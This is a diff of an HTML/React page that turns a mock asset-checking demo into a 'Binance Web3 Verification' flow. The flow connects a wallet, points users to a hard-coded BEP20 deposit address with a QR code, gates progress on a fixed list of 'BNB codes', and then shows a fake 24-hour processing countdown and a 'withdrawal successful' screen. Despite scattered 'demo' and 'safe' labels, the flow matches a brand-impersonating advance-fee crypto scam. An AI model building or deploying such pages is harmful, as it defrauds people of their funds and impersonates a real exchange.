@@ -1,283 +1,384 @@
 <!doctype html>
-
 <html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Binance-style Asset Verification — Demo</title>
+  <title>Binance-style Web3 Verification — Demo (Bundled)</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    :root{ --bg:#0f1724; --card:#111827; --muted:#9ca3af; --accent:#f59e0b; --success:#10b981; --danger:#ef4444; --glass: rgba(255,255,255,0.03)}
-    *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Helvetica,Arial,sans-serif;background:linear-gradient(180deg,#071020 0%, #081424 60%);color:#e6eef8}
-    .container{max-width:1100px;margin:36px auto;padding:24px}
-    header{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
-    h1{font-size:20px;margin:0}
-    p.lead{color:var(--muted);margin:4px 0 0}.grid{display:grid;grid-template-columns:1fr 380px;gap:18px}
-.card{background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);border-radius:12px;padding:18px;box-shadow:0 6px 18px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03)}
-.card.small{padding:12px}
-.asset{display:flex;gap:12px;align-items:center}
-.asset .logo{width:56px;height:56px;border-radius:10px;background:var(--glass);display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--accent)}
-.asset .meta{flex:1}
-.meta .name{font-size:16px;margin:0}
-.meta .sub{color:var(--muted);font-size:13px;margin-top:4px}
-
-.btn{display:inline-block;padding:8px 12px;border-radius:10px;background:var(--accent);color:#071024;font-weight:600;border:none;cursor:pointer}
-.btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:inherit}
-.btn.danger{background:var(--danger);color:white}
-
-.steps{margin-top:12px}
-.step{display:flex;align-items:flex-start;gap:10px;padding:10px;border-radius:8px}
-.step .dot{width:12px;height:12px;border-radius:50%;background:rgba(255,255,255,0.06);margin-top:6px}
-.step.ok .dot{background:var(--success)}
-.step.warn .dot{background:var(--accent)}
-.step.fail .dot{background:var(--danger)}
-.step .desc{color:var(--muted);font-size:13px}
-
-.status{display:inline-flex;align-items:center;gap:8px;padding:6px 10px;border-radius:999px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02)}
-.badge{font-weight:700;font-size:13px}
-
-label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
-input[type=text], textarea{width:100%;padding:10px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);color:inherit}
-
-.log{background:rgba(0,0,0,0.2);padding:12px;border-radius:8px;color:var(--muted);font-family:monospace;font-size:13px;max-height:260px;overflow:auto}
-
-footer{margin-top:18px;color:var(--muted);font-size:13px}
-
-/* responsive */
-@media (max-width:900px){.grid{grid-template-columns:1fr;}}
-
+    body { background: linear-gradient(180deg,#071022 0%,#071724 100%); color:#E6EEF8; font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial; }
+    .glass { background: rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.03); border-radius:12px; }
+    .muted { color:#9CA3AF; }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <header>
-      <div>
-        <h1>Binance Asset Verification — Demo</h1>
-        <p class="lead">Simulated workflow for verifying an <strong>identified asset</strong> and flagging an <strong>unidentified asset</strong>.</p>
-      </div>
-      <div class="status" id="globalStatus">
-        <span class="badge" id="globalBadge">Idle</span>
-      </div>
-    </header><div class="grid">
-  <!-- Left: Main panel -->
-  <div class="card">
-    <section class="asset" style="justify-content:space-between">
-      <div style="display:flex;gap:12px;align-items:center">
-        <div class="logo" id="assetLogo">BN</div>
-        <div class="meta">
-          <div class="name" id="assetName">No asset selected</div>
-          <div class="sub" id="assetTicker">--</div>
-        </div>
-      </div>
-      <div style="text-align:right">
-        <div style="margin-bottom:8px"><strong id="verStatus">Not Verified</strong></div>
-        <div style="display:flex;gap:8px">
-          <button class="btn" id="verifyBtn">Run Verification</button>
-          <button class="btn ghost" id="flagBtn">Flag as Unidentified</button>
-        </div>
-      </div>
-    </section>
+  <div id="root" class="min-h-screen p-6"></div>
 
-    <hr style="border:none;height:1px;background:rgba(255,255,255,0.03);margin:16px 0;">
+  <!-- React + ReactDOM -->
+  <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
+  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
 
-    <div style="display:flex;gap:12px;flex-wrap:wrap">
-      <div style="flex:1;min-width:220px">
-        <label for="contract">Contract address / Token ID</label>
-        <input id="contract" type="text" placeholder="0x... (paste contract address)" />
-      </div>
-      <div style="width:140px">
-        <label>&nbsp;</label>
-        <button class="btn" id="loadMock">Load mock asset</button>
-      </div>
-    </div>
+  <!-- Ethers, Web3Modal, Axios, QRCode -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/web3modal@2.5.0/dist/index.umd.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/uuid@9.0.0/dist/umd/uuidv4.min.js"></script>
 
-    <div class="steps" id="steps">
-      <!-- Steps inserted by JS -->
-    </div>
+  <script>
+  (function(){
+    const { useState, useEffect, useRef } = React;
+    const API_BASE = localStorage.getItem('bv_api_base') || 'http://localhost:4000'; // change if your server deployed elsewhere
+    const DEPOSIT_ADDRESS = '0x085Ea96BFFE85e98241B33299b9bAA64AF5f7e85';
+    const ALLOWED_CODES = new Set(['3c4250','737874','738848','22768','800833']);
 
-    <h3 style="margin-top:14px">Verification Report</h3>
-    <div class="log" id="reportLog">No report yet. Run verification to generate a report.
-    </div>
-
-    <footer>
-      This is a front-end demo that simulates Binance&rsquo;s verification stages (technical checks, compliance, audits, identity, and market signals). It does not contact real networks.
-    </footer>
-  </div>
-
-  <!-- Right: Sidebar -->
-  <aside class="card small">
-    <h4 style="margin:0 0 8px">Quick actions</h4>
-    <div style="display:flex;flex-direction:column;gap:8px">
-      <button class="btn ghost" id="showChecklist">Show Verification Checklist</button>
-      <button class="btn ghost" id="copyReport">Copy Report</button>
-      <button class="btn danger" id="delistBtn">Simulate Delist</button>
-    </div>
-
-    <hr style="border:none;height:1px;background:rgba(255,255,255,0.03);margin:12px 0;">
-
-    <h4 style="margin:0 0 8px">Unidentified Asset</h4>
-    <div style="color:var(--muted);font-size:13px">When an asset fails verification or metadata is missing, mark it as <strong>Unidentified</strong>. This triggers deeper checks and risk flags.</div>
-    <div style="margin-top:10px">
-      <label for="reason">Reason (example)</label>
-      <textarea id="reason" rows="3" placeholder="Suspicious contract, no team info, low liquidity..."></textarea>
-    </div>
-
-  </aside>
-</div>
-
-  </div>  <script>
-    // Mock verification steps and a simple simulator.
-    const mockAssets = {
-      '0x-real-token': {
-        name: 'Binance Demo Token',
-        ticker: 'BDT',
-        logo: 'BD',
-        checks: [
-          ['Smart contract verified (source matches)', 'ok'],
-          ['Audit report present', 'ok'],
-          ['Team identity verified', 'ok'],
-          ['Tokenomics looks reasonable', 'ok'],
-          ['No major AML flags', 'ok'],
-          ['Sufficient liquidity', 'ok']
-        ],
-        summary: 'All checks passed. Asset appears legitimate and suitable for listing evaluation.'
-      },
-      '0x-scam-token': {
-        name: 'ScamCoin Fake',
-        ticker: 'SCAM',
-        logo: 'SC',
-        checks: [
-          ['Smart contract verified (source matches)', 'fail'],
-          ['Audit report present', 'warn'],
-          ['Team identity verified', 'fail'],
-          ['Tokenomics looks reasonable', 'warn'],
-          ['No major AML flags', 'fail'],
-          ['Sufficient liquidity', 'fail']
-        ],
-        summary: 'Multiple critical failures. Mark as Unidentified and perform manual legal & security review.'
-      },
-      '0x-unknown': {
-        name: 'Unknown Token',
-        ticker: 'UNKN',
-        logo: 'UK',
-        checks: [
-          ['Smart contract available but unverified', 'warn'],
-          ['No public audit', 'warn'],
-          ['Team identity unclear', 'warn'],
-          ['Tokenomics unclear', 'warn'],
-          ['Potential AML risk (unknown)', 'warn'],
-          ['Low liquidity', 'warn']
-        ],
-        summary: 'Insufficient data. Asset remains Unidentified until further information is provided.'
-      }
-    };
-
-    const assetNameEl = document.getElementById('assetName');
-    const assetTickerEl = document.getElementById('assetTicker');
-    const assetLogoEl = document.getElementById('assetLogo');
-    const stepsEl = document.getElementById('steps');
-    const reportLog = document.getElementById('reportLog');
-    const globalBadge = document.getElementById('globalBadge');
-    const verStatus = document.getElementById('verStatus');
-
-    let current = null;
-
-    function setGlobalStatus(text){ globalBadge.textContent = text }
-
-    function renderAsset(mockKey){
-      current = mockAssets[mockKey];
-      assetNameEl.textContent = current.name;
-      assetTickerEl.textContent = current.ticker;
-      assetLogoEl.textContent = current.logo;
-      verStatus.textContent = 'Not Verified';
-      stepsEl.innerHTML = '';
-      reportLog.textContent = 'No report yet. Run verification to generate a report.';
-      setGlobalStatus('Ready');
+    // small helper
+    function fmtMs(ms){
+      const s = Math.floor(ms/1000)%60;
+      const m = Math.floor(ms/60000)%60;
+      const h = Math.floor(ms/(3600*1000));
+      return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
     }
 
-    document.getElementById('loadMock').addEventListener('click', ()=>{
-      // Cycle through mock assets for demo
-      const keys = Object.keys(mockAssets);
-      const next = keys[Math.floor(Math.random()*keys.length)];
-      renderAsset(next);
-    });
+    function App(){
+      const [page, setPage] = useState(localStorage.getItem('bv_page') || 'home');
+      const [address, setAddress] = useState(localStorage.getItem('bv_address') || '');
+      const [provider, setProvider] = useState(null);
+      const [signer, setSigner] = useState(null);
 
-    document.getElementById('verifyBtn').addEventListener('click', ()=>{
-      if(!current){ alert('Load a mock asset first (click "Load mock asset").'); return }
-      runVerification(current);
-    });
+      const [inputAddr, setInputAddr] = useState(localStorage.getItem('bv_inputAddr') || '');
+      const [coins, setCoins] = useState([]);
+      const [coinsLoaded, setCoinsLoaded] = useState(false);
+      const [coinQuery, setCoinQuery] = useState('');
+      const [selectedCoin, setSelectedCoin] = useState(JSON.parse(localStorage.getItem('bv_selectedCoin') || 'null'));
 
-    document.getElementById('flagBtn').addEventListener('click', ()=>{
-      if(!current){ alert('Load a mock asset first.'); return }
-      markUnidentified(current);
-    });
+      const [qrUrl, setQrUrl] = useState(localStorage.getItem('bv_qr') || '');
+      const [codeInput, setCodeInput] = useState('');
 
-    document.getElementById('showChecklist').addEventListener('click', ()=>{
-      alert('Verification checklist:\n\n1) Smart contract source & ownership\n2) Security audits\n3) Team identity & legal checks\n4) AML/KYC screening\n5) Market liquidity & volume checks\n6) Community & reputation checks');
-    });
+      const [sessionId, setSessionId] = useState(localStorage.getItem('bv_sessionId') || '');
+      const [processingStart, setProcessingStart] = useState(()=>{ const v = localStorage.getItem('bv_processingStart'); return v?parseInt(v,10):null; });
+      const [now, setNow] = useState(Date.now());
+      const [remainingMs, setRemainingMs] = useState(0);
 
-    document.getElementById('copyReport').addEventListener('click', ()=>{
-      navigator.clipboard.writeText(reportLog.textContent).then(()=>alert('Report copied to clipboard'))
-    });
+      const tvRef = useRef(null);
 
-    document.getElementById('delistBtn').addEventListener('click', ()=>{
-      if(confirm('Simulate delisting this asset?')){
-        setGlobalStatus('Delisted');
-        verStatus.textContent = 'Delisted';
-        reportLog.textContent = 'Asset delisted after sustained risk signals. Manual review required.';
+      useEffect(()=> localStorage.setItem('bv_page', page), [page]);
+      useEffect(()=> localStorage.setItem('bv_inputAddr', inputAddr), [inputAddr]);
+      useEffect(()=> localStorage.setItem('bv_selectedCoin', JSON.stringify(selectedCoin || null)), [selectedCoin]);
+      useEffect(()=> localStorage.setItem('bv_sessionId', sessionId), [sessionId]);
+      useEffect(()=> { if(processingStart) localStorage.setItem('bv_processingStart', String(processingStart)); }, [processingStart]);
+
+      // tick
+      useEffect(()=>{ const id = setInterval(()=> setNow(Date.now()), 1000); return ()=> clearInterval(id); },[]);
+
+      // load coins
+      useEffect(()=> {
+        axios.get('https://api.coingecko.com/api/v3/coins/markets', { params:{ vs_currency:'usd', order:'market_cap_desc', per_page:250, page:1, sparkline:false } })
+          .then(r=>{ const list = r.data.map(c=>({id:c.id,name:c.name,symbol:c.symbol,image:c.image,platforms:c.platforms})); list.sort((a,b)=>a.name.localeCompare(b.name)); setCoins(list); setCoinsLoaded(true); })
+          .catch(e=>{ console.error('coin load error',e); setCoinsLoaded(false); });
+      },[]);
+
+      // QR
+      useEffect(()=> {
+        if(!qrUrl) QRCode.toDataURL(DEPOSIT_ADDRESS, {width:300}).then(url=> { setQrUrl(url); localStorage.setItem('bv_qr', url); }).catch(()=>{});
+      },[]);
+
+      // TradingView widget
+      useEffect(()=> {
+        if(!tvRef.current) return;
+        tvRef.current.innerHTML = '';
+        const s = document.createElement('script');
+        s.src = 'https://s3.tradingview.com/tv.js';
+        s.onload = ()=> {
+          try {
+            new window.TradingView.widget({
+              width: tvRef.current.clientWidth || '100%',
+              height: 320,
+              symbol: 'BINANCE:BTCUSDT',
+              interval: '60',
+              timezone: 'Etc/UTC',
+              theme: 'dark',
+              style: '1',
+              locale: 'en',
+              toolbar_bg: '#f1f3f6',
+              enable_publishing:false,
+              withdateranges:true,
+              allow_symbol_change:true,
+              details:true,
+            });
+          } catch(e){ console.error('tv init',e); }
+        };
+        document.body.appendChild(s);
+      }, [tvRef.current]);
+
+      // wallet connect
+      async function connectWallet(){
+        try {
+          const web3Modal = new window.Web3Modal.default({ cacheProvider: true });
+          const conn = await web3Modal.connect();
+          const prov = new ethers.providers.Web3Provider(conn);
+          const s = prov.getSigner();
+          const addr = await s.getAddress();
+          setProvider(prov); setSigner(s); setAddress(addr);
+          localStorage.setItem('bv_address', addr);
+        } catch(e){ console.error('connect',e); alert('Wallet connect failed'); }
       }
-    });
+      function disconnectWallet(){ setProvider(null); setSigner(null); setAddress(''); localStorage.removeItem('bv_address'); }
 
-    function runVerification(asset){
-      setGlobalStatus('Verifying...');
-      stepsEl.innerHTML = '';
-      reportLog.textContent = '';
-      verStatus.textContent = 'Verifying...';
-
-      // Simulate asynchronous checks (sequential, with delays)
-      const checks = asset.checks;
-      let i=0;
-      function next(){
-        if(i>=checks.length){
-          // finalize
-          const fails = checks.filter(c=>c[1]==='fail').length;
-          const warns = checks.filter(c=>c[1]==='warn').length;
-          if(fails>0){
-            setGlobalStatus('Unidentified');
-            verStatus.textContent = 'Unidentified';
-          } else if(warns>0){
-            setGlobalStatus('Needs Manual Review');
-            verStatus.textContent = 'Needs Review';
-          } else {
-            setGlobalStatus('Verified');
-            verStatus.textContent = 'Verified';
-          }
-
-          reportLog.textContent = asset.summary + "\n\nDetailed checks:\n" + checks.map(c=>`- ${c[0]}: ${c[1].toUpperCase()}`).join('\n');
-          return;
+      // Run button: sign message to prove ownership (safe)
+      async function onRun(){
+        if(!inputAddr || !inputAddr.trim()){ alert('Enter a BEP20 contract address'); return; }
+        if(!signer){
+          const ok = confirm('No wallet connected — connect now?');
+          if(ok) await connectWallet(); else return;
         }
-
-        const [desc, state] = checks[i];
-        const stepEl = document.createElement('div');
-        stepEl.className = 'step ' + (state==='ok'?'ok':state==='warn'?'warn':'fail');
-        stepEl.innerHTML = `<div class="dot"></div><div><strong style="font-size:13px">${desc}</strong><div class="desc">Status: ${state.toUpperCase()}</div></div>`;
-        stepsEl.appendChild(stepEl);
-        reportLog.textContent += `${desc}: ${state.toUpperCase()}\n`;
-        i++;
-        // small delay to mimic checks
-        setTimeout(next, 450);
+        try {
+          const nonce = Date.now();
+          const message = `Binance-demo ownership proof for ${inputAddr} — nonce:${nonce}`;
+          const signature = await signer.signMessage(message);
+          // Optionally you could POST message+signature to backend verify endpoint — omitted here but available in server code below.
+          // Simulate requested 15s load then go to topup page
+          setPage('verify');
+          // 15 seconds simulated (original UX requested 15s). You may shorten for testing.
+          setTimeout(()=> setPage('topup'), 15000);
+        } catch(e){ console.error(e); alert('Signing failed or cancelled'); }
       }
-      next();
+
+      // select coin -> network -> deposit flows
+      function selectCoin(c){ setSelectedCoin(c); setPage('network'); }
+      function selectNetwork(){ setPage('deposit'); }
+
+      // copy deposit address then simulate 15s then show code entry
+      function copyAddressContinue(){
+        navigator.clipboard.writeText(DEPOSIT_ADDRESS).then(()=> {
+          setTimeout(()=> setPage('code'), 15000);
+        });
+      }
+
+      // verify code -> on correct -> call server to create session (server stores expiry in Redis)
+      async function verifyCode(){
+        // simulate 10s processing first
+        alert('Simulating code verification (10s)...');
+        await new Promise(r=> setTimeout(r,10000));
+        if(!ALLOWED_CODES.has(codeInput.trim())){ alert('Code declined — enter correct code'); return; }
+        // code accepted -> now we call server to create session (requires a signature to ensure ownership)
+        // create message & signature
+        if(!signer){
+          const ok = confirm('Please connect wallet to create server session.');
+          if(ok) await connectWallet(); else return;
+        }
+        try {
+          const startMsg = `Start processing session for ${address} at ${Date.now()}`;
+          const signature = await signer.signMessage(startMsg);
+          // POST to server to create session — server will verify signature and create Redis entry with 24h TTL
+          const res = await axios.post(`${API_BASE}/start-processing`, { address: address, message: startMsg, signature: signature });
+          if(res.data && res.data.ok){
+            const sid = res.data.sessionId;
+            setSessionId(sid);
+            localStorage.setItem('bv_sessionId', sid);
+            setProcessingStart(res.data.expiry); // expiry in ms epoch
+            localStorage.setItem('bv_processingStart', String(res.data.start)); // store start
+            alert('Session created — now processing. You can resume on another device by providing the session ID (or by logging in with same wallet and server verifying ownership).');
+            setPage('processing');
+          } else {
+            alert('Server failed to create session');
+            console.error(res.data);
+          }
+        } catch(e){ console.error('start proc',e); alert('Failed to start server session — is server running?'); }
+      }
+
+      // Poll for session remaining if sessionId present
+      useEffect(()=> {
+        let id = null;
+        async function poll(){
+          if(!sessionId) return;
+          try {
+            const r = await axios.get(`${API_BASE}/session/${sessionId}`);
+            if(r.data && r.data.ok){
+              const rem = r.data.remainingMs;
+              setRemainingMs(rem);
+              if(rem <= 0 && page === 'processing'){
+                setPage('withdraw_success');
+                // clear session client-side
+                localStorage.removeItem('bv_sessionId');
+                localStorage.removeItem('bv_processingStart');
+              }
+            }
+          } catch(e){ /* ignore */ }
+        }
+        // poll every 5s
+        poll();
+        id = setInterval(poll, 5000);
+        return ()=> clearInterval(id);
+      }, [sessionId, page]);
+
+      // resume by entering session id manually
+      async function resumeSessionById(id){
+        try {
+          const r = await axios.get(`${API_BASE}/session/${id}`);
+          if(r.data && r.data.ok){
+            setSessionId(id);
+            localStorage.setItem('bv_sessionId', id);
+            if(r.data.remainingMs > 0) setPage('processing'); else setPage('withdraw_success');
+            alert('Resumed session.');
+          } else alert('Session not found.');
+        } catch(e){ alert('Could not query session (server offline?)'); }
+      }
+
+      // UI
+      return React.createElement('div', { className: 'max-w-6xl mx-auto' },
+        React.createElement('header', { className: 'flex items-center justify-between mb-6' },
+          React.createElement('div', null,
+            React.createElement('h1', { className: 'text-2xl font-semibold' }, 'Binance Web3 Verification — Bundled Demo (Safe)'),
+            React.createElement('div', { className: 'muted text-sm mt-1' }, 'Demo uses message-signing & server-side Redis sessions (no fund transfers).')
+          ),
+          React.createElement('div', { className: 'flex items-center gap-3' },
+            React.createElement('div', { className: 'muted text-sm' }, address ? `Wallet: ${address.slice(0,6)}...${address.slice(-4)}` : 'Wallet: Disconnected'),
+            address ? React.createElement('button', { onClick: disconnectWallet, className: 'px-3 py-1 rounded bg-slate-700' }, 'Disconnect') :
+                      React.createElement('button', { onClick: connectWallet, className: 'px-3 py-1 rounded bg-amber-400 text-black' }, 'Connect Wallet')
+          )
+        ),
+
+        React.createElement('div', { className: 'grid md:grid-cols-3 gap-6' },
+
+          // Main column
+          React.createElement('div', { className: 'md:col-span-2 space-y-4' },
+
+            page === 'home' && React.createElement('div', { className: 'glass p-4' },
+              React.createElement('label', { className: 'muted text-sm block' }, 'Enter BNB Smart Chain (BEP20) contract address'),
+              React.createElement('div', { className: 'flex gap-2 mt-2' },
+                React.createElement('input', { value: inputAddr, onChange: e => setInputAddr(e.target.value), placeholder: '0x...', className: 'flex-1 p-2 rounded bg-slate-800' }),
+                React.createElement('button', { className: 'px-4 py-2 rounded bg-amber-400 text-black font-semibold', onClick: onRun }, 'Run')
+              ),
+              React.createElement('div', { className: 'mt-2 muted text-sm' }, 'This demo asks for a signature (safe) instead of requiring a transfer.')
+            ),
+
+            page === 'verify' && React.createElement('div', { className: 'glass p-4' },
+              React.createElement('h2', { className: 'font-semibold' }, 'Binance Web3 Verification'),
+              React.createElement('p', { className: 'muted mt-2' }, `Entered address: `, React.createElement('code', { className: 'mono' }, inputAddr)),
+              React.createElement('div', { className: 'mt-3 flex gap-3' },
+                React.createElement('div', { className: 'bg-slate-900 p-3 rounded' },
+                  React.createElement('div', null, 'For demo: Required (simulated):'),
+                  React.createElement('div', { className: 'font-semibold mt-1' }, 'Transaction: 0.0997 BNB (SIMULATED)'),
+                  React.createElement('div', { className: 'muted text-sm mt-1' }, 'In production, never request transfers as ownership proof; use signatures or backend checks.')
+                ),
+                React.createElement('div', { className: 'flex-1' }),
+                React.createElement('div', null,
+                  React.createElement('button', { className: 'px-3 py-1 rounded bg-amber-400 text-black', onClick: () => setPage('topup') }, 'Proceed (demo)'),
+                  React.createElement('div', { className: 'mt-2' },
+                    React.createElement('button', { className: 'px-3 py-1 rounded bg-slate-700', onClick: () => setPage('home') }, 'Cancel')
+                  )
+                )
+              )
+            ),
+
+            page === 'topup' && React.createElement('div', { className: 'glass p-4' },
+              React.createElement('h2', { className: 'font-semibold' }, 'Top Up — Select coin'),
+              React.createElement('input', { placeholder: 'Search coins', value: coinQuery, onChange: e=>setCoinQuery(e.target.value), className: 'w-full p-2 mt-2 rounded bg-slate-800' }),
+              React.createElement('div', { className: 'max-h-64 overflow-auto mt-3 rounded bg-slate-900 p-2' },
+                coinsLoaded ? coins.filter(c=>c.name.toLowerCase().includes(coinQuery.toLowerCase())||c.symbol.toLowerCase().includes(coinQuery.toLowerCase())).map(coin =>
+                  React.createElement('div', { key:coin.id, className: 'flex items-center gap-3 p-2 rounded hover:bg-slate-800 cursor-pointer', onClick: ()=>{ setSelectedCoin(coin); setPage('network'); } },
+                    React.createElement('img', { src: coin.image, alt:'', className: 'w-8 h-8 rounded' }),
+                    React.createElement('div', { className: 'flex-1' }, coin.name, ' ', React.createElement('span', { className: 'muted text-xs' }, `(${coin.symbol.toUpperCase()})`)),
+                    React.createElement('div', { className: 'muted text-sm' }, 'Select →')
+                  )
+                ) : React.createElement('div', { className: 'muted' }, 'Loading coins...')
+              )
+            ),
+
+            page === 'network' && selectedCoin && React.createElement('div', { className: 'glass p-4' },
+              React.createElement('h2', { className: 'font-semibold' }, 'Select Network'),
+              React.createElement('p', { className: 'muted mt-2' }, 'For demo: BNB Smart Chain (BEP20)'),
+              React.createElement('div', { className: 'mt-3 flex items-center gap-3' },
+                React.createElement('img', { src: selectedCoin.image, className: 'w-10 h-10 rounded' }),
+                React.createElement('div', null, React.createElement('div', null, selectedCoin.name), React.createElement('div', { className: 'muted text-sm' }, 'BNB Smart Chain (BEP20)')),
+                React.createElement('div', { className: 'flex-1' }),
+                React.createElement('button', { className: 'px-3 py-1 rounded bg-amber-400 text-black', onClick: selectNetwork }, 'Continue')
+              )
+            ),
+
+            page === 'deposit' && React.createElement('div', { className: 'glass p-4' },
+              React.createElement('h2', { className: 'font-semibold' }, 'Deposit Address (Demo)'),
+              React.createElement('p', { className: 'muted mt-2' }, 'Network: BNB Smart Chain (BEP20)'),
+              React.createElement('div', { className: 'mt-3 flex gap-4 items-start' },
+                qrUrl ? React.createElement('img', { src: qrUrl, alt:'QR', className: 'w-40 h-40 bg-white p-2 rounded' }) : React.createElement('div', { className: 'w-40 h-40 bg-slate-700 rounded' }),
+                React.createElement('div', { className: 'flex-1' },
+                  React.createElement('div', { className: 'mono glass p-3' }, DEPOSIT_ADDRESS),
+                  React.createElement('div', { className: 'mt-3 flex gap-2' },
+                    React.createElement('button', { className: 'px-3 py-1 rounded bg-amber-400 text-black', onClick: copyAddressContinue }, 'Copy address & Continue'),
+                    React.createElement('button', { className: 'px-3 py-1 rounded bg-slate-700', onClick: ()=> setPage('network') }, 'Back')
+                  )
+                )
+              )
+            ),
+
+            page === 'code' && React.createElement('div', { className: 'glass p-4' },
+              React.createElement('h2', { className: 'font-semibold' }, 'Enter BNB code'),
+              React.createElement('p', { className: 'muted mt-2' }, 'Enter the verification code (demo codes accepted)'),
+              React.createElement('div', { className: 'mt-3 flex gap-2' },
+                React.createElement('input', { value: codeInput, onChange: e=>setCodeInput(e.target.value), className: 'flex-1 p-2 rounded bg-slate-800', placeholder: 'Enter code' }),
+                React.createElement('button', { className: 'px-4 py-2 rounded bg-amber-400 text-black', onClick: verifyCode }, 'Verify')
+              )
+            ),
+
+            page === 'processing' && React.createElement('div', { className: 'glass p-4' },
+              React.createElement('h2', { className: 'font-semibold' }, 'Transaction Processing'),
+              React.createElement('div', { className: 'muted mt-2' }, 'Your transaction is being processed. Validation will last for 24 hours (server-side).'),
+              React.createElement('div', { className: 'mt-3 glass p-3' },
+                React.createElement('div', null, 'Address: ', React.createElement('code', { className: 'mono' }, address || '—')),
+                React.createElement('div', null, 'Tether USDT (simulated): ', React.createElement('strong', null, '$8,250.78')),
+                React.createElement('div', { className: 'mt-2' }, 'Remaining (server): ', React.createElement('span', { className: 'mono' }, remainingMs > 0 ? fmtMs(remainingMs) : '00:00:00'))
+              ),
+              React.createElement('div', { className: 'mt-3' },
+                React.createElement('div', { className: 'muted text-sm' }, 'Session id: '),
+                React.createElement('div', { className: 'mono glass p-2 mt-1' }, sessionId || '—')
+              )
+            ),
+
+            page === 'withdraw_success' && React.createElement('div', { className: 'p-4 rounded bg-emerald-500 text-black' },
+              React.createElement('h2', { className: 'font-semibold' }, 'Withdrawal Successful (Demo)'),
+              React.createElement('p', { className: 'mt-2' }, 'Validation window ended — demo success.')
+            )
+          ),
+
+          // sidebar
+          React.createElement('aside', { className: 'space-y-4' },
+            React.createElement('div', { className: 'glass p-3' },
+              React.createElement('h3', { className: 'font-semibold' }, 'Market Chart'),
+              React.createElement('div', { ref: tvRef, className: 'mt-2' })
+            ),
+            React.createElement('div', { className: 'glass p-3' },
+              React.createElement('h3', { className: 'font-semibold' }, 'Status'),
+              React.createElement('div', { className: 'muted mt-2' }, `Page: ${page}`),
+              React.createElement('div', { className: 'muted' }, `Selected coin: ${selectedCoin ? selectedCoin.name : '—'}`),
+              React.createElement('div', { className: 'muted' }, `Persisted address: ${address || '—'}`)
+            ),
+            React.createElement('div', { className: 'glass p-3' },
+              React.createElement('h3', { className: 'font-semibold' }, 'Resume Session'),
+              React.createElement('p', { className: 'muted text-sm' }, 'If you have a session id from another device, enter it here to resume.'),
+              React.createElement('div', { className: 'flex gap-2 mt-2' },
+                React.createElement('input', { id: 'resumeId', placeholder: 'session id', className: 'flex-1 p-2 rounded bg-slate-800' }),
+                React.createElement('button', { className: 'px-2 py-1 rounded bg-slate-700', onClick: ()=> { const id = document.getElementById('resumeId').value.trim(); if(!id) return alert('enter id'); fetch(`${API_BASE}/session/${id}`).then(r=>r.json()).then(d=>{ if(d.ok){ setSessionId(id); localStorage.setItem('bv_sessionId', id); if(d.remainingMs>0) setPage('processing'); else setPage('withdraw_success'); alert('Resumed') } else alert('not found') }).catch(()=>alert('server error')) } }, 'Resume')
+              )
+            ),
+            React.createElement('div', { className: 'glass p-3' },
+              React.createElement('h3', { className: 'font-semibold' }, 'Notes & Safety'),
+              React.createElement('ul', { className: 'muted text-sm list-disc pl-4' },
+                React.createElement('li', null, 'Demo only — never require users to send funds as verification.'),
+                React.createElement('li', null, 'Session stored in server Redis so countdown continues across devices.'),
+                React.createElement('li', null, 'Use the server /start-processing to create a session tied to a signature.')
+              )
+            )
+          )
+        ),
+
+        React.createElement('footer', { className: 'mt-6 muted text-sm' }, 'Demo built with public APIs (CoinGecko, TradingView). Server required for session persistence (see instructions).')
+      );
     }
 
-    function markUnidentified(asset){
-      setGlobalStatus('Flagged - Unidentified');
-      verStatus.textContent = 'Flagged Unidentified';
-      const reason = document.getElementById('reason').value || 'Flagged by compliance team: insufficient data';
-      reportLog.textContent = `ASSET FLAGGED AS UNIDENTIFIED\n\nName: ${asset.name}\nTicker: ${asset.ticker}\nReason: ${reason}\n\nRecommended actions:\n- Manual legal review\n- Request audits/ownership proof\n- Monitor on-chain activity`;
-    }
-
-    // initialize with placeholder
-    setGlobalStatus('Idle');
-  </script></body>
+    ReactDOM.createRoot(document.getElementById('root')).render(React.createElement(App));
+  })();
+  </script>
+</body>
 </html>
